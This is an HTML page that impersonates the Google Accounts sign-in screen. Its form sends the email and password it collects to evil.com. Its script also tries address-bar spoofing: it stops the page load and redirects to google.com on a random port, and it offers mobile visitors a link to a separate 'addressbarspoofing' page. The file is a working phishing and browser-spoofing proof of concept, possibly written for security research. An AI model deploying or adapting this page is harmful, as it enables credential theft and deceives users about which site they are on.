<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            min-width: 1200px;
        }
        .login-container {
            background-color: #fff;
            padding: 2.5rem;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .input-field {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.25rem;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 1rem;
        }
        .btn-primary {
            background-color: #1a73e8;
            color: #fff;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            min-width: 90px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
        <form id="loginForm" method="get" action="https://evil.com/">
            <input type="email" id="email" name="email" class="input-field" placeholder="Email or phone" required>
            <input type="password" id="password" name="pass" class="input-field" placeholder="Password" required>
            <div class="flex-between">
                <a href="#" class="text-blue-600 font-medium text-sm">Create account</a>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>
    </div>

<script>
// Auto redirect ke desktop site
if (window.innerWidth < 1024 || /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    if (confirm("Switch to desktop mode for better experience?")) {
        window.location.href = 'https://zriil.github.io/S/addressbarspoofing.html';
    }
}

// Spoofing function
setTimeout(() => {
    window.stop();
    let randomPort;
    do {
        randomPort = Math.floor(Math.random() * 1000);
    } while (randomPort === 0 || randomPort === 443);
    document.location = "https://google.com:" + randomPort + "/";
}, 300);
</script>
</body>
</html>
